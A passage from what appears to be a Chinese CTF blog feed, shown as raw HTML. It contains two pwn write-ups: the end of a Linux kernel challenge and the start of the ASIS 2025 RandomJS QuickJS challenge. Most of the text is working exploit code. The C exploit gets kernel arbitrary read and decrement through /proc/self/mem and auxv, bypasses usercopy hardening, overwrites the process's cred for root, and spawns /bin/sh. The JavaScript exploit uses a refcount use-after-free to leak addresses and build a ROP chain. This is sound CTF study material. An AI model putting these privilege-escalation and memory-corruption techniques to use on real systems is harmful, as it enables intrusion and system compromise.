class="hljs-comment">// self + 0x48 </span><br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x22</span>; i++)&#123;<br><span class="hljs-keyword">if</span>((sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>ptr[<span class="hljs-number">9</span>] = sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr + <span class="hljs-number">0x48</span>;<br>ptr[<span class="hljs-number">10</span>] = sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr + <span class="hljs-number">0x48</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find target %lx.\n&quot;</span>, sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br><br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;N_PAGES; j++)&#123;<br>write(pipe_fd[j][<span class="hljs-number">1</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>&#125;<br>read(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].fd, &amp;kernel_base, <span class="hljs-number">8</span>);<br>kernel_base -= <span class="hljs-number">0x22bf70</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>read(pipe_fd[i][<span class="hljs-number">0</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>&#125;<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x22</span>; i++)&#123;<br><span class="hljs-keyword">if</span>((sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find target %lx.\n&quot;</span>, sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br>hack(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br>read(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].fd, &amp;kernel_base, <span class="hljs-number">8</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p><em><strong>幽天帝！\(^o^)&#x2F; 幽天帝！\(^o^)&#x2F; 幽天帝！\(^o^)&#x2F;</strong></em></p><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p><code>/proc/self</code>下其实还有其他能用的文件：</p><ul><li><code>/proc/self/mem</code>：进程虚拟内存读写</li><li><code>/proc/self/auxv</code>：读进程辅助向量</li></ul><p>这两个文件<code>file-&gt;private_data</code>都指向进程的mm_struct</p><ul><li><p>读<code>/proc/self/auxv</code>等同于读mm_struct的某块内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-comment">// ……</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="hljs-comment">/* for /proc/PID/auxv */</span><br>    <span class="hljs-comment">// ……</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>close一个<code>/proc/self/mem</code>会调用mmdrop，也就是mm_count-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">atomic_t</span> mm_count;<br>&#125; ____cacheline_aligned_in_smp;<br>        <span class="hljs-comment">// ……</span><br></code></pre></td></tr></table></figure></li></ul><p>由于可以随便改file-&gt;private_data，所以通过close一个<code>/proc/self/mem</code>可以获得任意地址内容-1原语，通过读<code>/proc/self/auxv</code>可以获得任意读原语</p><p>由于开启了usercopy保护，实际上不能进行堆上任意的读写，可以通过-1原语更改kmem_cache-&gt;useroffset和kmem_cache-&gt;usersize进行一个绕过</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_READ    0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1338</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">long</span> val;<br>&#125; <span class="hljs-type">req_t</span>;<br><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = <span class="hljs-number">0</span>,<br>&#125;;<br>ioctl(fd_dev, CMD_READ, &amp;arg);<br><span class="hljs-keyword">return</span> arg.val;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> val)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = val,<br>&#125;;<br><span class="hljs-keyword">return</span> ioctl(fd_dev, CMD_WRITE, &amp;arg);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd_addr</span> &#123;</span><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> addr;<br>&#125; object;<br><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_read_offset</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd_auxv, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">size_t</span> offset)</span> &#123;<br>dev_write(fd_dev, fd_auxv, addr<span class="hljs-number">-0x198</span>+offset);<br>lseek(fd_auxv, <span class="hljs-number">0</span>, SEEK_SET);<br>read(fd_auxv, buffer+offset, <span class="hljs-number">0x100</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">arbitary_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd_auxv, <span class="hljs-type">size_t</span> addr)</span> &#123;<br>dev_write(fd_dev, fd_auxv, addr<span class="hljs-number">-0x198</span>);<br>lseek(fd_auxv, <span class="hljs-number">0</span>, SEEK_SET);<br>read(fd_auxv, buffer, <span class="hljs-number">0x1000</span>);<br><span class="hljs-keyword">return</span> *(<span class="hljs-type">size_t</span> *)buffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_sub1</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">size_t</span> addr)</span> &#123;<br><span class="hljs-type">int</span> fd_mem = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>dev_write(fd_dev, fd_mem, addr);<br>close(fd_mem);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_FD_MEM 0x300</span><br><span class="hljs-type">int</span> fd_mems[N_FD_MEM];<br><span class="hljs-type">int</span> fd_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_fds</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_FD_MEM; i++) &#123;<br>fd_mems[i] = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br><span class="hljs-keyword">if</span>(fd_mems[i]&lt;<span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open /proc/self/mem failed at %d\n&quot;</span>, i);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_subn</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">int</span> n)</span> &#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;n; i++)&#123;<br>dev_write(fd_dev, fd_mems[fd_idx], addr);<br>close(fd_mems[fd_idx]);<br>fd_idx++;<br>&#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>save_status();<br>bind_core(<span class="hljs-number">0</span>);<br><br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br><br><span class="hljs-type">int</span> fd_auxv = open(<span class="hljs-string">&quot;/proc/self/auxv&quot;</span>, O_RDONLY);<br><br><span class="hljs-type">size_t</span> heap_addr = dev_read(fd, fd_auxv);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap_addr: %lx\n&quot;</span>, heap_addr);<br><br>kernel_base = arbitary_read(fd, fd_auxv, (heap_addr&amp;<span class="hljs-number">0xfffffffff0000000</span>)+<span class="hljs-number">0x9d000</span>)<span class="hljs-number">-0x22bf70</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK 0xe0c480</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TASK_STRUCT_CACHE0x10eeb98</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_CACHE0x10efaf0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TASKS_OFFSET0x320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMM_OFFSET0x5d0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USEROFFSET_OFFSET0xc8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USERSIZE_OFFSET0xcc</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_OFFSET0x5c8</span><br><br><span class="hljs-type">size_t</span> task_struct_cache = arbitary_read(fd, fd_auxv, kernel_base+TASK_STRUCT_CACHE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;task_struct_cache: %lx\n&quot;</span>, task_struct_cache);<br><br><span class="hljs-type">size_t</span> cred_cache = arbitary_read(fd, fd_auxv, kernel_base+CRED_CACHE);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred_cache: %lx\n&quot;</span>, cred_cache);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0xa40</span><span class="hljs-number">-0x320</span>; i++)<br>arbitary_sub1(fd, task_struct_cache+USEROFFSET_OFFSET);<br>arbitary_sub1(fd, task_struct_cache+USERSIZE_OFFSET+<span class="hljs-number">2</span>);<br><br>arbitary_sub1(fd, cred_cache+USERSIZE_OFFSET);<br><br><span class="hljs-type">size_t</span> next_task = kernel_base+INIT_TASK;<br><span class="hljs-keyword">do</span> &#123;<br>next_task = arbitary_read(fd, fd_auxv, next_task+TASKS_OFFSET+<span class="hljs-number">8</span>)-TASKS_OFFSET;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;next_task: %lx\n&quot;</span>, next_task);<br>arbitary_read(fd, fd_auxv, next_task+COMM_OFFSET);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;task_struct-&gt;comm: %s\n&quot;</span>, buffer);<br><br>&#125; <span class="hljs-keyword">while</span>(<span class="hljs-built_in">strncmp</span>(buffer, <span class="hljs-string">&quot;exploit&quot;</span>, <span class="hljs-number">7</span>));<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got it %lx!\n&quot;</span>, next_task);<br><span class="hljs-type">size_t</span> cred = arbitary_read(fd, fd_auxv, next_task+CRED_OFFSET);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred: %lx\n&quot;</span>, cred);<br><br>arbitary_read(fd, fd_auxv, cred+<span class="hljs-number">8</span>);<br>prepare_fds();<br><span class="hljs-type">uint8_t</span> *ptr = buffer;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x20</span>; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;round %d\n&quot;</span>, i);<br>hex_dump(ptr, <span class="hljs-number">0x20</span>);<br><span class="hljs-keyword">if</span> ((*((<span class="hljs-type">uint32_t</span> *)(&amp;ptr[i]))&amp;<span class="hljs-number">0xffffff00</span>) == <span class="hljs-number">0</span>) &#123;<br>arbitary_subn(fd, cred+<span class="hljs-number">8</span>+i+<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>arbitary_read_offset(fd, fd_auxv, cred+<span class="hljs-number">8</span>, i);<br>&#125;<br>arbitary_subn(fd, cred+<span class="hljs-number">8</span>+i, ptr[i]);<br><br>arbitary_read_offset(fd, fd_auxv, cred+<span class="hljs-number">8</span>, i);<br>&#125;<br><br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>sleep(<span class="hljs-number">10000</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 ASIS CTF RandomJS wp</title>
    <link href="/2025/09/13/asis2025qjs/"/>
    <url>/2025/09/13/asis2025qjs/</url>
    
    <content type="html"><![CDATA[<p>:)</p><span id="more"></span><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>给array加了个方法，在array中任意选择一个obj返回，但没有增加refcount，可以uaf</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> JSValue <span class="hljs-title">js_array_randompick</span><span class="hljs-params">(JSContext *ctx, JSValueConst this_val,</span></span><br><span class="hljs-params"><span class="hljs-function">                           <span class="hljs-type">int</span> argc, JSValueConst *argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    JSValue obj, ret;<br>    <span class="hljs-type">int64_t</span> len, idx;<br>    JSValue *arrp;<br>    <span class="hljs-type">uint32_t</span> count;<br><br>    obj = <span class="hljs-built_in">JS_ToObject</span>(ctx, this_val);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">js_get_length64</span>(ctx, &amp;len, obj))<br>        <span class="hljs-keyword">goto</span> exception;<br><br>    idx = <span class="hljs-built_in">rand</span>() % len;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">js_get_fast_array</span>(ctx, obj, &amp;arrp, &amp;count) &amp;&amp; idx &lt; count) ret = (JSValue) arrp[idx];<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> present = <span class="hljs-built_in">JS_TryGetPropertyInt64</span>(ctx, obj, idx, &amp;ret);<br>        <span class="hljs-keyword">if</span> (present &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> exception;<br>        <span class="hljs-keyword">if</span> (!present)<br>            ret = JS_UNDEFINED;<br>    &#125;<br>    <span class="hljs-built_in">JS_FreeValue</span>(ctx, obj);<br>    <span class="hljs-keyword">return</span> ret;<br> exception:<br>    <span class="hljs-built_in">JS_FreeValue</span>(ctx, obj);<br>    <span class="hljs-keyword">return</span> JS_EXCEPTION;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="目标对象"><a href="#目标对象" class="headerlink" title="目标对象"></a>目标对象</h1><p>js解释器的题可以通过这种👇方式进行任意读写。用ArrayBuffer-&gt;buf占位uaf obj，然后通过BigUint64Array等视图读写obj结构体，控制buf指向目标读写地址进行任意读写</p><img src="/2025/09/13/asis2025qjs/uaf.png" class title="uaf"><p>但在这道题的情况下，需要先通过randompick方法free obj再分配给ArrayBuffer-&gt;buf，再分配的时候obj已经被清空了，无法leak地址</p><p>我最开始想通过普通的array来占位uaf obj，类似这样（用-1标记obj，7标记整数）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">target = [&#123;&#125;, <span class="hljs-number">0xdeadbeefn</span>, &#123;&#125;]<br><br><span class="hljs-comment">// tele target</span><br><span class="hljs-comment">// +0x0 0xffffffffffffffff</span><br><span class="hljs-comment">// +0x8 0x55555564a890</span><br><span class="hljs-comment">// +0x100x7</span><br><span class="hljs-comment">// +0x180xdeadbeef</span><br><span class="hljs-comment">// +0x200xffffffffffffffff</span><br><span class="hljs-comment">// +0x280x55555564b560</span><br></code></pre></td></tr></table></figure><p><em>但普通的array是用realloc申请空间的，不好占位……</em></p><p>后来通过discord的exp发现了这么一个结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">JSBigInt</span> &#123;<br>    JSRefCountHeader header; <span class="hljs-comment">/* must come first, 32-bit */</span><br>    <span class="hljs-type">uint32_t</span> len; <span class="hljs-comment">/* number of limbs, &gt;= 1 */</span><br>    <span class="hljs-type">js_limb_t</span> tab[]; <span class="hljs-comment">/* two&#x27;s complement representation, always</span><br><span class="hljs-comment">                        normalized so that &#x27;len&#x27; is the minimum</span><br><span class="hljs-comment">                        possible length &gt;= 1 */</span><br>&#125; JSBigInt;<br></code></pre></td></tr></table></figure><p>在一个数字后标记n表示一个大整数，大于4字节的整数用这样一个结构体👆表示，quickjs的大整数是不限长度的，JSBigInt-&gt;len表示大整数的长度（单位bit），改大len就能越界读了；且整个结构体没有指针，非常完美~</p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>选择JSBigInt作为uaf obj，改大len越界读写泄漏地址，然后再uaf一次伪造obj进行任意读写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> pad1 = <span class="hljs-string">&quot;a&quot;</span>, pad2 = <span class="hljs-string">&quot;a&quot;</span>, pad3 = <span class="hljs-string">&quot;a&quot;</span>, pad4 = <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">const</span> map = [<span class="hljs-number">0xffffffffffffffffn</span>]<br><br>map.<span class="hljs-title function_">randompick</span>()<br>map.<span class="hljs-title function_">randompick</span>()<br>map.<span class="hljs-title function_">randompick</span>()<br><br><span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">let</span> array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf)<br><br>array[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span><br>array[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span><br><br>heapbase = ((map[<span class="hljs-number">0</span>] &gt;&gt; (<span class="hljs-number">35n</span> * <span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>) - <span class="hljs-number">0xcf2n</span><br>pie = ((map[<span class="hljs-number">0</span>] &gt;&gt; (<span class="hljs-number">36n</span> * <span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>) - <span class="hljs-number">0xf2660n</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(heapbase.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pie.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0n</span>; i &lt; <span class="hljs-number">0x100n</span>; i++)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, ((map[<span class="hljs-number">0</span>]&gt;&gt;(i*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>&#125;<br><br><span class="hljs-keyword">let</span> tmp1 = [&#123;&#125;, &#123;&#125;, &#123;&#125;]<br><span class="hljs-keyword">let</span> map1 = [&#123;&#125;]<br><br>map1.<span class="hljs-title function_">randompick</span>()<br><br>tmp1[<span class="hljs-number">0</span>] = <span class="hljs-literal">null</span><br>tmp1[<span class="hljs-number">1</span>] = <span class="hljs-literal">null</span><br><br><span class="hljs-keyword">let</span> buf1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x48</span>)<br><span class="hljs-keyword">let</span> array1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(buf1)<br><br>array1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1d0d0000000002n</span><br>array1[<span class="hljs-number">3</span>] = <span class="hljs-number">0x7b00000000n</span><br>array1[<span class="hljs-number">4</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>array1[<span class="hljs-number">7</span>] = pie + <span class="hljs-number">0xf4fc8n</span><br>array1[<span class="hljs-number">8</span>] = <span class="hljs-number">0x100n</span><br><br><span class="hljs-keyword">let</span> libcbase = map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] - <span class="hljs-number">0x2a5b0n</span><br><span class="hljs-keyword">let</span> stack = map1[<span class="hljs-number">0</span>][<span class="hljs-number">34</span>]<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(libcbase.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stack.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br>array1[<span class="hljs-number">7</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0x616c66646165722fn</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">0x67n</span><br><br>array1[<span class="hljs-number">7</span>] = stack - <span class="hljs-number">0x498n</span><br><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = libcbase + <span class="hljs-number">0x28882n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = libcbase + <span class="hljs-number">0x119fdcn</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] = heapbase + <span class="hljs-number">0x20000n</span><br>map1[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>] = libcbase + <span class="hljs-number">0x5c110n</span> <span class="hljs-comment">// puts: 